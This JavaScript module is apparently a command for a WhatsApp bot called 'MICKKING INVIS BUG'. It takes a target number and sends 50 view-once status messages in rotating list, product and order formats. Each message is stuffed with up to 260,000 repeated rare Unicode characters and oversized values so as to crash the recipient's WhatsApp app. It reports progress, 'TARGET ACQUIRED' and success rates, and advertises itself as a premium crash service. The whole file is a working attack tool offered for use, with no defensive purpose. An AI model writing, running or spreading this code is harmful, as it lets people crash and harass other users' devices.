import pkg from "bailey";
import crypto from 'crypto';

const { proto, generateWAMessageFromContent } = pkg;
import channelSender from '../commands/channelSender.js';

// Configuration for invisible bug
const INVIS_CONFIG = {
    ITERATIONS: 50,
    COOLDOWN: 1500,
    CHAR_LENGTH: 260000,
    MAX_RETRIES: 3,
    PATTERNS: ['list', 'product', 'order']
};

async function generateInvisChar() {
    const chars = ['𑪆', '᭙', '᮰', 'ꦾ'];
    return chars[Math.floor(Math.random() * chars.length)];
}

async function sios(client, destinatario, pattern = 'list') {
    try {
        const invis_char = await generateInvisChar();
        let messageContent;

        // Create message content based on pattern
        switch(pattern) {
            case 'list':
                messageContent = {
                    listResponseMessage: {
                        title: '⚡ MICKKING INVISIBLE CRASH ⚡\n',
                        description: "\n\n\n" + invis_char.repeat(INVIS_CONFIG.CHAR_LENGTH),
                        singleSelectReply: {
                            selectedId: crypto.randomBytes(8).toString('hex')
                        },
                        listType: 1
                    }
                };
                break;
            
            case 'product':
                messageContent = {
                    productMessage: {
                        product: {
                            title: '⚡ MICKKING INVISIBLE CRASH ⚡',
                            description: invis_char.repeat(INVIS_CONFIG.CHAR_LENGTH/2),
                            currencyCode: "USD",
                            priceAmount1000: "999999999",
                            productImage: Buffer.from([])
                        }
                    }
                };
                break;
            
            case 'order':
                messageContent = {
                    orderMessage: {
                        orderId: crypto.randomBytes(16).toString('hex'),
                        thumbnail: Buffer.from([]),
                        itemCount: 999999999,
                        status: 1,
                        surface: 1,
                        message: invis_char.repeat(INVIS_CONFIG.CHAR_LENGTH),
                        orderTitle: '⚡ MICKKING INVISIBLE CRASH ⚡'
                    }
                };
                break;
        }

        const tmsg = await generateWAMessageFromContent(destinatario, {
            viewOnceMessage: {
                message: messageContent
            }
        }, {});

        await client.relayMessage("status@broadcast", tmsg.message, {

            messageId: tmsg.key.id,
            statusJidList: [destinatario],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: destinatario },
                        content: undefined,
                    }]
                }]
            }]
        });
    } catch (error) {
        console.error("Error in sios function:", error);
        throw error; // Re-throw to handle in the main function
    }
}

export async function siosinvis(message, client) {
    try {
        const remoteJid = message.key?.remoteJid;
        if (!remoteJid) {
            throw new Error("Message JID is undefined.");
        }

        // Check if it's a group
        if (remoteJid.endsWith('@g.us')) {
            throw new Error("❌ This command cannot be used in groups.");
        }

        // Send initial status message
        await client.sendMessage(remoteJid, { 
            text: `━━━━『 *MICKKING INVIS BUG* 』━━━━\n\n` +
                 `⚡ *Status:* Initializing...\n` +
                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                 `_Preparing invisible crash sequence..._`,
            contextInfo: {
                externalAdReply: {
                    title: "MICKKING Bug Service",
                    body: "Premium Invisible Crash",
                    showAdAttribution: true,
                    renderLargerThumbnail: true
                }
            }
        });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim();

        const parts = commandAndArgs.split(/\s+/);

        const args = parts.slice(1);

        let participant;

        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {

            participant = message.message.extendedTextMessage.contextInfo.participant;

        } else if (args.length > 0) {

            participant = args[0].replace('@', '') + '@s.whatsapp.net';

        } else {

            throw new Error('Specify the person to bug.');
        }

        // Progress tracking
        let successCount = 0;
        let failCount = 0;

        // Update target info
        await client.sendMessage(remoteJid, {
            text: `━━━━『 *TARGET ACQUIRED* 』━━━━\n\n` +
                 `🎯 *Target:* @${participant.split('@')[0]}\n` +
                 `💫 *Mode:* Invisible Crash\n` +
                 `⚡ *Iterations:* ${INVIS_CONFIG.ITERATIONS}\n\n` +
                 `_Initiating invisible crash..._`,
            mentions: [participant]
        });

        // Execute invisible crash sequence
        for (let i = 0; i < INVIS_CONFIG.ITERATIONS; i++) {
            try {
                // Show progress every 5 iterations
                if (i % 5 === 0) {
                    await client.sendMessage(remoteJid, {
                        text: `*Progress Update:*\n` +
                             `✅ Sent: ${i}/${INVIS_CONFIG.ITERATIONS}\n` +
                             `📊 Success Rate: ${((successCount/(i||1))*100).toFixed(1)}%\n` +
                             `⏳ Remaining: ${((INVIS_CONFIG.ITERATIONS-i)*1.5).toFixed(1)} seconds`
                    });
                }

                // Rotate through different patterns
                const pattern = INVIS_CONFIG.PATTERNS[i % INVIS_CONFIG.PATTERNS.length];
                await sios(client, participant, pattern);
                successCount++;

                // Add random delay between attempts
                await new Promise(resolve => setTimeout(resolve, 
                    INVIS_CONFIG.COOLDOWN + Math.random() * 500
                ));
            } catch (iterError) {
                console.error(`Crash iteration ${i + 1} failed:`, iterError);
                failCount++;
                continue;
            }
        }

        // Send completion report
        await client.sendMessage(remoteJid, {
            text: `━━━━『 *CRASH COMPLETE* 』━━━━\n\n` +
                 `🎯 *Target:* @${participant.split('@')[0]}\n` +
                 `✅ *Success:* ${successCount}\n` +
                 `❌ *Failed:* ${failCount}\n` +
                 `📊 *Success Rate:* ${((successCount/INVIS_CONFIG.ITERATIONS)*100).toFixed(1)}%\n` +
                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                 `━━『 *MICKKING INVISIBLE CRASH* 』━━`,
            mentions: [participant],
            contextInfo: {
                externalAdReply: {
                    title: "Invisible Crash Complete",
                    body: `Success Rate: ${((successCount/INVIS_CONFIG.ITERATIONS)*100).toFixed(1)}%`,
                    showAdAttribution: true
                }
            }
        });

    } catch (error) {
        console.error("Invisible crash error:", error);
        
        // Send formatted error message
        await client.sendMessage(remoteJid, {
            text: `━━━━『 *ERROR REPORT* 』━━━━\n\n` +
                 `❌ *Operation Failed*\n` +
                 `⚠️ *Error:* ${error.message}\n` +
                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                 `_Please try again in a few minutes..._`,
            contextInfo: {
                externalAdReply: {
                    title: "Invisible Crash Service",
                    body: "Error Notification",
                    showAdAttribution: true
                }
            }
        });
    }
}

export default siosinvis;